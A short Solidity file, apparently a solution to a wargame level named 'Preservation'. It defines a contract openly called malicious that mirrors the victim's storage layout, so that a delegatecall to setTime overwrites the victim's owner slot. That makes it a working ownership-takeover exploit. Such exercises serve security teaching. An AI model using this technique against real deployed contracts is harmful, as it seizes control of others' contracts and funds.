// SPDX-License-Identifier: MIT
// Solidity versions 0.8.0 and higher do not allow direct explicit conversion from uint256 to address
pragma solidity 0.6.0;

contract MallicousTimeZoneLib {
    // match the Preservation storage layout
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

	// instead of changing the time, we change the value owner
    function setTime(uint256 time) public {
        owner = address(time);
    }
}
